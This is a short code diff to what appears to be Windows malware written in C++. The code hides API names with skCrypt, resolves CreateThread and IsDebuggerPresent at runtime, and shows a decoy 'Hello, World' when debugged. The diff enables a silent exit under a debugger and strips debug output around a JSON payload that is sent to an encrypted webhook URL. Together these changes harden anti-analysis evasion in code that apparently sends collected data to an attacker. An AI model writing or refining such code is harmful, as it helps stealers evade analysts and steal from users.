@@ -34,7 +34,7 @@ int main(int argc, char** argv) {
 	IsDebPresent isDebPresent = (IsDebPresent)GetProcAddress(GetModuleHandleA(skCrypt("kernel32.dll")), skCrypt("IsDebuggerPresent"));
 	if (isDebPresent()) {
 		std::cout << "Hello, World" << std::endl;
-		//return 0;
+		return 0;
 	}
 
 	CreateThreadCustom createThreadCustom = (CreateThreadCustom)GetProcAddress(GetModuleHandleA(skCrypt("kernel32.dll")), skCrypt("CreateThread"));
@@ -144,7 +144,6 @@ int main(int argc, char** argv) {
 		}
 
 	}
-	std::cout << 5 << std::endl;
 
 	for (auto& thread : threads) {
 		WaitForSingleObject(thread, INFINITE);
@@ -191,8 +190,6 @@ int main(int argc, char** argv) {
 	  ],
 	  "attachments": []
 	})");
-
-	std::cout << body << std::endl;
 
 	std::string webhook = WEBHOOK_URL.decrypt();
 
